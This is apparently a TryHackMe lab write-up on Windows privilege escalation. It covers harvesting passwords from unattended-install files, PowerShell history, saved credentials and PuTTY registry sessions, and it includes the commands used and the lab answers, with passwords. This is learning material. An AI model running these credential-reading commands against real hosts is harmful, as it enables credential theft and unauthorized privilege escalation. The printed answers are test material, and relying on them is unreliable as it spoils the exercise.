**TASK 3: Harvesting Passwords from Usual Spots**

I am using the machine that is attached on the thm platform if you want to connect using the RDP the command will be as follows:

        xfreerdp /v:<ip> /u:thm-unpriv /p:Password321


**Unattended Windows Installations**

When windows is installed in large number of hosts the network administrator may use windows deployment services that will reduce their work to go to each machine and manually set 
everything on different machines, but sometimes  this commands are stored in system which may contain some information it they are mostly stored in these different location

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml 


try them and see if your luck favours you or not :0


**Powershell History**

When ever a use runs a command in powershell they get saved and can be checked using this command :   

     %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

**To view saved keys in windows we can use** 

    cmdkey /list  
    
  While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

    runas /savecred /user:admin cmd.exe



**Q. A password for the julia.jones user has been left on the Powershell history. What is the password?**

      ZuperCkretPa5z

![Screenshot 2023-10-22 235457](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/3c7e276b-1914-4ab9-84f4-e047f0b07823)

**Q. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?**

      098n0x35skjD3

**Q. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**

This can solved in two steps
- 1 run this commad :

        runas /savecred /user:mike.ratz cmd.exe
- 2 the flag in on the desktop so the command should like this:

        C:\Users\mike.katz\Desktop\flag.txt

![Screenshot 2023-10-22 235840](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/6dad6adf-ccec-479b-a378-03ca98b6dbc0)


**Q. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**

For this run this command: 

      reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

![image](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/afc73203-ffa2-4227-99d0-4e657be9dd7e)


